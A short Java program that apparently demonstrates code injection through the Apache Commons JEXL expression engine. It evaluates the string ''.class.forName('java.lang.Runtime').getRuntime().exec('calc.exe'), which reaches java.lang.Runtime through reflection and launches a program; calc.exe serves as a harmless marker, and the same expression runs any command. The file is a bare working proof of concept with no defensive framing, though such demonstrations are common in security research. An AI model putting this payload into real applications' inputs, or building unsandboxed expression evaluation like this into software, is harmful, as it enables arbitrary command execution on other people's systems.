import java.io.IOException;

import org.apache.commons.jexl3.JexlBuilder;
import org.apache.commons.jexl3.JexlContext;
import org.apache.commons.jexl3.JexlEngine;
import org.apache.commons.jexl3.JexlExpression;
import org.apache.commons.jexl3.MapContext;

public class Main {
public static void main(String args[]) throws IOException {
// Create or retrieve an engine
JexlEngine jexl = new JexlBuilder().create();
// Create an expression
//String jexlExp = "new(\"java.lang.String\", \"hello wolrd\")";
String jexlExp = "''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')";
JexlExpression e = jexl.createExpression( jexlExp );
// Create a context and add data
JexlContext jc = new MapContext();

// Now evaluate the expression, getting the result
Object o = e.evaluate(jc);	
System.out.println(o);
}
}